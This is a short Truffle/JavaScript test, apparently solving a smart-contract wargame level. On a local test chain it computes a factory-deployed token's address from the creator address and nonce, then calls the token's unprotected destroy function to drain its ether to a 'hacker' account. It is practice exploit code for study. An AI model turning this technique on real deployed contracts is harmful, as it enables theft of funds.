const Hacker = artifacts.require("Hacker");
const Recovery = artifacts.require("Recovery");
const SimpleToken = artifacts.require("SimpleToken");
const { expect } = require("chai");
const { BN } = require("@openzeppelin/test-helpers");

/*
 * uncomment accounts to access the test accounts made available by the
 * Ethereum client
 * See docs: https://www.trufflesuite.com/docs/truffle/testing/writing-tests-in-javascript
 */
contract("Hacker", function ([_owner, _hacker]) {
  it("should destroy token contract", async function () {
    const targetContract = await Recovery.new();
    // generate new token contract
    await targetContract.generateToken("NewToken", 100000, { from: _hacker });
    // Calculate new token's address
    const address = `0x${web3.utils.keccak256(`0xd694${targetContract.address.toLowerCase().slice(2)}01`).slice(26)}`;
    const tokenContract = await SimpleToken.at(address);
    expect(await tokenContract.balances(_hacker)).to.be.bignumber.equal(new BN(100000));
    // send ether to increase balance
    await tokenContract.send(web3.utils.toWei("0.5", "ether"), { from: _hacker });
    expect(await web3.eth.getBalance(address)).to.be.equal(web3.utils.toWei("0.5", "ether"));
    // destroy token contract to get back ether
    const result = await tokenContract.destroy(_hacker);
    expect(result.receipt.status).to.be.equal(true);
    expect(await web3.eth.getBalance(address)).to.be.equal("0");
  });
});
